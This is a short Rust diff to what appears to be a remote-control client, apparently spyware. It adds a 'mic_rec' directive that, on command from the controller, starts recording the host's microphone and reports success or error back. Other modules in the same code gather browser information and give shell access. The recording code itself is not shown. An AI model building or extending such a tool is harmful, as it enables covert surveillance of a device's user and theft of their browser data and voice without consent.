@@ -7,6 +7,7 @@ mod shell;
 use rand::Rng;
 use tokio::task::JoinHandle;
 mod browser_info;
+mod mic_rec;
 
 #[tokio::main]
 async fn main() {
@@ -144,6 +145,26 @@ async fn main() {
                                     eprintln!("Erreur browser_info : {}", e);
                                     let _ = connexion::send_directive_status(
                                         "browser_info",
+                                        "error",
+                                        &format!("Erreur  : {:?}", e),
+                                    )
+                                    .await;
+                                }
+                            }
+                        }),
+                        "mic_rec" => tokio::spawn(async {
+                            println!("Démarrage de l'enregistrement micro");
+                            match mic_rec::record_mic().await {
+                                Ok(_) => {
+                                    let _ = connexion::send_directive_status(
+                                        "mic_rec", "success", "Terminé",
+                                    )
+                                    .await;
+                                }
+                                Err(e) => {
+                                    eprintln!("Erreur mic_rec : {}", e);
+                                    let _ = connexion::send_directive_status(
+                                        "mic_rec",
                                         "error",
                                         &format!("Erreur  : {:?}", e),
                                     )
